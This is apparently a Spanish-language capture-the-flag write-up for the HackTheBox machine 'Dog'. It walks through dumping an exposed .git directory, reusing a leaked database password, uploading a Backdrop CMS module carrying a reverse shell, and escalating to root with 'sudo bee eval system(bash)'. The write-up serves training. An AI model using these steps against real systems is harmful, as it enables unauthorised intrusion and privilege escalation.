
# Dog

<figure><img src="/files/aHK4ht7DYAdVSpWl3APk" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Dog`
* **IP:** `10.10.11.58`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `02/06/2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.58
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://dog.htb` y observamos que parece ser un blog de cuidados sobre perros.

<figure><img src="/files/tAjAi8XuR0nB3olgzt5C" alt=""><figcaption></figcaption></figure>

En el footer encontramos que es un Backdrop CMS:

<figure><img src="/files/PL6I3qZkmTPIAOvOORH4" alt=""><figcaption></figcaption></figure>

{% embed url="<https://backdropcms.org/>" %}

## <mark style="color:purple;">Enumeración Web</mark>

### Login web

Encontramos un login pero no tenemos credenciales:

<figure><img src="/files/0gt2CXvkgIAOq0ncXBuK" alt=""><figcaption></figcaption></figure>

Observamos que al acceder a login se pasa un parámetro en la URL que podría contener un usuario. Haciendo fuzzing de parámetros no encontramos nada relevante.

```http
http://dog.htb/?q=user/login
```

### Fuzzing de Directorios

```bash
dirsearch -u http://dog.htb -x 404


  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/cypher/reports/http_dog.htb/_25-06-01_17-02-12.txt

Target: http://dog.htb/

[17:02:12] Starting: 
[17:02:15] 301 -  301B  - /.git  ->  http://dog.htb/.git/
[17:02:15] 200 -  405B  - /.git/branches/
[17:02:15] 200 -   95B  - /.git/COMMIT_EDITMSG
[17:02:15] 200 -  601B  - /.git/
[17:02:15] 200 -   92B  - /.git/config
[17:02:15] 200 -   73B  - /.git/description
[17:02:15] 200 -   23B  - /.git/HEAD
[17:02:15] 200 -  648B  - /.git/hooks/
[17:02:15] 200 -  453B  - /.git/info/
[17:02:15] 200 -  240B  - /.git/info/exclude
[17:02:15] 200 -  473B  - /.git/logs/
[17:02:15] 200 -  230B  - /.git/logs/HEAD
[17:02:15] 301 -  317B  - /.git/logs/refs/heads  ->  http://dog.htb/.git/logs/refs/heads/
[17:02:15] 301 -  311B  - /.git/logs/refs  ->  http://dog.htb/.git/logs/refs/
[17:02:15] 200 -  230B  - /.git/logs/refs/heads/master
[17:02:15] 301 -  312B  - /.git/refs/heads  ->  http://dog.htb/.git/refs/heads/
[17:02:15] 200 -  456B  - /.git/refs/
[17:02:15] 200 -   41B  - /.git/refs/heads/master
[17:02:15] 200 -    2KB - /.git/objects/
[17:02:15] 301 -  311B  - /.git/refs/tags  ->  http://dog.htb/.git/refs/tags/
[17:02:15] 200 -  337KB - /.git/index
[17:02:28] 200 -  592B  - /files/
[17:02:30] 200 -    4KB - /index.php
[17:02:31] 200 -  453B  - /layouts/
[17:02:31] 200 -    7KB - /LICENSE.txt
[17:02:33] 301 -  304B  - /modules  ->  http://dog.htb/modules/
[17:02:33] 200 -  442B  - /modules/
[17:02:37] 200 -    5KB - /README.md
[17:02:37] 200 -  528B  - /robots.txt
[17:02:38] 403 -  272B  - /server-status
[17:02:38] 403 -  272B  - /server-status/
[17:02:38] 200 -    0B  - /settings.php
[17:02:39] 301 -  302B  - /sites  ->  http://dog.htb/sites/
[17:02:41] 200 -  451B  - /themes/
[17:02:41] 301 -  303B  - /themes  ->  http://dog.htb/themes/
```

El escaneo realizado con `dirsearch` ha revelado información crítica, especialmente la exposición de un directorio `.git` accesible públicamente. Esto representa un **grave riesgo de seguridad**, ya que podría permitir la extracción de código fuente, credenciales y otros datos sensibles.

#### **Hallazgos Clave**

1. **Directorio `.git` expuesto** (Código fuente comprometido):
   * Se encontraron múltiples archivos y subdirectorios de Git (como `HEAD`, `config`, `index`, `objects/`, etc.).
   * **Riesgo**: Permite reconstruir el repositorio completo usando herramientas como `git-dumper` o `DVCS-Pillage`.

### Dumpeo del git expuesto

```bash
pip install git-dumper

git-dumper http://dog.htb/.git /home/kali/Escritorio/machines/htb/dog

[-] Testing http://dog.htb/.git/HEAD [200]
[-] Testing http://dog.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dog.htb/.gitignore [404]
[-] Fetching http://dog.htb/.git/ [200]
[-] Fetching http://dog.htb/.git/refs/ [200]
[-] Fetching http://dog.htb/.git/hooks/ [200]
[-] Fetching http://dog.htb/.git/logs/ [200]
[-] Fetching http://dog.htb/.git/info/ [200]
[-] Fetching http://dog.htb/.git/branches/ [200]
[-] Fetching http://dog.htb/.git/objects/ [200]
[-] Fetching http://dog.htb/.git/refs/heads/ [200]
[-] Fetching http://dog.htb/.git/refs/tags/ [200]
[-] Fetching http://dog.htb/.git/logs/refs/ [200]
[-] Fetching http://dog.htb/.git/objects/0a/ [200]
[-] Fetching http://dog.htb/.git/objects/0d/ [200]
[-] Fetching http://dog.htb/.git/objects/0b/ [200]
[-] Fetching http://dog.htb/.git/objects/0c/ [200]
[-] Fetching http://dog.htb/.git/objects/0e/ [200]
<---SNIP--->
[-] Fetching http://dog.htb/.git/objects/ff/f99b60388f8dabaa3ccb41a86ac100b29a75fa [200]
[-] Fetching http://dog.htb/.git/objects/ff/e2bdb70e3508a43577a1e63d8f3e0eb1954bed [200]
[-] Fetching http://dog.htb/.git/objects/ff/2e5d5fa02e1160cadbed45b913ff04e9e9613a [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Actualizadas 2873 rutas desde el índice
```

Ahora tenemos en nuestro Kali el repositorio completo:

```bash
ls -la
                                       
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  .
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 16:50:17 2025  ..
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:56 2025  .git
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  core
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  files
.rwxrwxr-x kali kali 578 B  Sun Jun  1 17:12:55 2025  index.php
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  layouts
.rwxrwxr-x kali kali  18 KB Sun Jun  1 17:12:54 2025  LICENSE.txt
.rwxrwxr-x kali kali 5.2 KB Sun Jun  1 17:12:54 2025  README.md
.rwxrwxr-x kali kali 1.2 KB Sun Jun  1 17:12:55 2025 󰚩 robots.txt
.rwxrwxr-x kali kali  21 KB Sun Jun  1 17:12:55 2025  settings.php
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  sites
drwxrwxr-x kali kali 4.0 KB Sun Jun  1 17:12:55 2025  themes
```

### Enumeración del repositorio

Con `tree .` observamos todos los archivos de forma extendida para analizar posibles archivos que nos interesen.

En el archivo `settings.php` encontramos credenciales de root para conectarnos a la base de datos:

```php
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: settings.php
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ /**
   3   │  * @file
   4   │  * Main Backdrop CMS configuration file.
   5   │  */
   6   │ 
   7   │ /**
   8   │  * Database configuration:
   9   │  *
  10   │  * Most sites can configure their database by entering the connection string
  11   │  * below. If using primary/replica databases or multiple connections, see the
  12   │  * advanced database documentation at
  13   │  * https://api.backdropcms.org/database-configuration
  14   │  */
  15   │ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
  16   │ $database_prefix = '';
  <---SNIP--->
  80   │ $settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
 140   │  *
 141   │  * Examples:
 142   │  *   $base_url = 'http://www.example.com';
 143   │  *   $base_url = 'http://www.example.com:8888';
 144   │  *   $base_url = 'http://www.example.com/backdrop';
 145   │  *   $base_url = 'https://www.example.com:8888/backdrop';
```

Probamos esa contraseña para acceder al panel de login pero no funciona.&#x20;

### Búsqueda de usuarios

Buscando por una extensión de email como `@dog.htb` encontramos el usuario Tiffany:

```bash
grep -r "@dog.htb"

files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Al probar la contraseña que hemos encontrado para la base de datos y este usuario tiffany conseguimos acceder al Dashboard:

```
tiffany:BackDropJ2024DS2024
```

<figure><img src="/files/y58PnFKZljAp3WfBb9T7" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Explotación</mark>

Podemos seguir esta guía para subir una reverse shell y ganar RCE en Backdrop CMS:

{% embed url="<https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-modules-8ab2629fae1c>" %}

### Subida de Reverse Shell

En el menú seleccionamos `Functionality > Install New Modules`

<figure><img src="/files/3BaWCgVfMte4eDtfndLn" alt=""><figcaption></figcaption></figure>

Solo se permite cargar módulos en los formatos `tar tgz gz bz2`

<figure><img src="/files/3bsmkq6rpP6vkPoCGwD4" alt=""><figcaption></figcaption></figure>

Seleccionamos `Manual installation`, y elegimos la opción `Upload a module`

<figure><img src="/files/rmuNYhaBV2P7qMzrHjFZ" alt=""><figcaption></figcaption></figure>

### Descargar módulo oficial

En el siguiente enlace nos descargaremos un módulo oficial:

{% embed url="<https://backdropcms.org/modules>" %}

Descargaremos uno cualquiera, por ejemplo el de `Shaperrific`

<figure><img src="/files/AxhXmgHC77Ht467O4tpK" alt=""><figcaption></figcaption></figure>

Extraemos el zip y vemos el archivo `template.php`

<figure><img src="/files/w8JYggXoTR489bn5rsEh" alt=""><figcaption></figcaption></figure>

### Crear reverse shell

{% embed url="<https://www.revshells.com/>" %}

Usaremos una reverse shell en PHP como la de PentestMonkey:

<figure><img src="/files/XrTKaQyPD26ihzQewhDF" alt=""><figcaption></figcaption></figure>

### Editar módulo PHP

Reemplazamos el contenido de `template.php` con la reverse shell creada:

<figure><img src="/files/sMqOliAPiFyJRyqDcbIp" alt=""><figcaption></figcaption></figure>

Ahora comprimimos la carpeta completa en `tar.gz`:

```bash
tar -czvf shaperrific.tar.gz shaperrific/

shaperrific/
shaperrific/template.php
shaperrific/README.md
shaperrific/color/
shaperrific/color/color.inc
shaperrific/screenshot.png
shaperrific/css/
shaperrific/css/colors.css
shaperrific/css/styles.css
shaperrific/css/shapes.css
shaperrific/css/color-admin.css
shaperrific/js/
shaperrific/js/shaperrific-override.js
shaperrific/shaperrific.info
shaperrific/theme-settings.php
shaperrific/LICENSE.txt
```

### Subida a la web

Abrimos un listener de netcat antes de subir el archivo:

```bash
nc -nlvp 4444
listening on [any] 4444 ... 
```

Cargamos el `tar.gz` malicioso y le damos a install:

<figure><img src="/files/K5fUOBwkM6IDK9t4Rw0K" alt=""><figcaption></figcaption></figure>

Hacemos click en `Enable newly added themes`, lo habilitamos y lo establecemos por defecto:

<figure><img src="/files/Mj2xBI6fpI9eBehAMIVG" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/BW2P2jyCxLxLyRmACcX7" alt=""><figcaption></figcaption></figure>

Al acceder a la configuración del módulo recibimos la shell automáticamente como el usuario www-data:

<figure><img src="/files/CMm1cpvKfH7b8jyY7frQ" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Enumeración interna</mark>

En el directorio home encontramos 2 usuarios interesantes: `jobert` y `johncusack`

```bash
bash-5.0$ cd /home

bash-5.0$ ls
jobert
johncusack
```

En el directorio de johncusack encontramos la user flag, pero no tenemos permisos para acceder:

```bash
bash-5.0$ cd johncusack

bash-5.0$ ls
user.txt

bash-5.0$ cat user.txt
cat: user.txt: Permission denied
```

### Acceso a la base de datos

Antes en el archivo `settings.php` encontramos credenciales para acceder a la base de datos como root, por lo que vamos a echarle un vistazo:

```
mysql://root:BackDropJ2024DS2024
```

```sql
bash-5.0$ mysql -u root -p   
mysql -u root -p
Enter password: BackDropJ2024DS2024   

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 140
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;       
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| backdrop           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> USE backdrop;
USE backdrop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
SHOW TABLES;
+-----------------------------+
| Tables_in_backdrop          |
+-----------------------------+
| batch                       |
| cache                       |
| cache_admin_bar             |
| cache_bootstrap             |
| cache_entity_comment        |
| cache_entity_file           |
| cache_entity_node           |
| cache_entity_taxonomy_term  |
<------------SNIP------------->
| url_alias                   |
| users                       | # Tabla de usuarios que nos interesa
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
59 rows in set (0.00 sec)

mysql> SELECT * FROM users;
SELECT * FROM users;
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1748888909 | 1748887714 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
9 rows in set (0.00 sec)

mysql> 
```

Bingo! Tenemos los hashes de todos los usuarios del sistema, aunque no vemos el de `johncusack`, que es el usuario que tiene la user flag. Podría ser el usuario `john` o `jPAdminB`

### Cracking de hashes

Copiamos estos en un archivo llamado `hashes.txt`:

```bash
$S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/.  # jPAdminB
$S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1  # jobert
$S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD  # dogBackDropSystem
$S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji.  # john
$S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS  # morris
$S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV  # axel
$S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT  # rosa
$S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v  # tiffany
```

Estos hashes están en formato `Drupal 7 hash` (phpass base64, 32-bit), por lo que usaremos el modo de Hashcat 7900:

```bash
hashcat -m 7900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force

hashcat (v6.2.6) starting
```

Despues de bastante tiempo no conseguimos crackear ningún hash.

## <mark style="color:purple;">User flag</mark>

Probando la contraseña para acceder a MySQL con el usuario `johncusack` conseguimos acceder por SSH. Esto es algo que siempre deberíamos probar al tener alguna contraseña válida:

```
johncusack:BackDropJ2024DS2024
```

<pre class="language-bash"><code class="lang-bash"><strong>afsh4ck@kali$ ssh johncusack@10.10.11.58 
</strong> 
The authenticity of host '10.10.11.58 (10.10.11.58)' can't be established.
ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.58' (ED25519) to the list of known hosts.

johncusack@10.10.11.58's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

-bash-5.0$ whoami
johncusack
-bash-5.0$ id
uid=1001(johncusack) gid=1001(johncusack) groups=1001(johncusack)
-bash-5.0$ ls
user.txt
-bash-5.0$ cat user.txt 
a53cd3b5ced77df7faf8e15************
</code></pre>

## <mark style="color:purple;">Escala de privilegios</mark>

### Permisos de ejecución

El usuario johncusack puede ejecutar bee en el sistema:

```bash
-bash-5.0$ sudo -l

[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

No encontramos ningún GTFOBins sobre el binario bee, así que vamos a echarle un ojo:

```bash
-bash-5.0$ bee

🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 <----SNIP---->

  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.

  php-script
   scr
   Execute an arbitrary PHP file after bootstrapping Backdrop.
```

Bee permite ejecutar `eval` y `php-scrip` que son funcionalidades peligrosísimas si pueden ejecutarse como root, ya que permiten ejecutar **código PHP arbitrario** tras bootstrapping de Backdrop.

```bash
-bash-5.0$ sudo /usr/local/bin/bee eval "system('bash');"

 ✘  The required bootstrap level for 'eval' is not ready. 
```

Al probarlo nos da un error "The required bootstrap level for 'eval' is not ready". Esto indica que `bee` no está ejecutando `eval` porque **no encuentra el entorno** Backdrop o no estámos en el directorio correcto donde se encuentra la instalación.

### Buscar el index de la aplicación

Concretamente se encuentra en la ruta `/var/www/html`

```bash
johncusack@dog:~$ ls -la /var/www/html

total 96
drwxrwxr-x 9 www-data www-data  4096 Feb  7 21:21 .
drwxr-xr-x 3 root     root      4096 Jul  8  2024 ..
drwxrwx--- 9 www-data www-data  4096 Jul  8  2024 core
drwxrwx--- 7 www-data www-data  4096 Jul  9  2024 files
drwxr-xr-x 8 root     root      4096 Feb  7 21:22 .git
-rwxrwx--- 1 www-data www-data   578 Mar  7  2024 index.php
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 layouts
-rwxrwx--- 1 www-data www-data 18092 Mar  7  2024 LICENSE.txt
drwxrwx--- 2 www-data www-data  4096 Aug 16  2024 modules
-rwxrwx--- 1 www-data www-data  5285 Mar  7  2024 README.md
-rwxrwx--- 1 www-data www-data  1198 Mar  7  2024 robots.txt
-rwxrwx--- 1 www-data www-data 21732 Jul  8  2024 settings.php
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 sites
drwxrwx--- 2 www-data www-data  4096 Jul  8  2024 themes
```

## <mark style="color:purple;">Root flag</mark>

```shell-session
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('bash');"
[sudo] password for johncusack:

root@dog:/var/www/html# whoami
root

root@dog:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)

root@dog:/var/www/html# cd /root
root@dog:~# ls
root.txt

root@dog:~# cat root.txt
5b5f7f5c776c71b7c6c66************
```
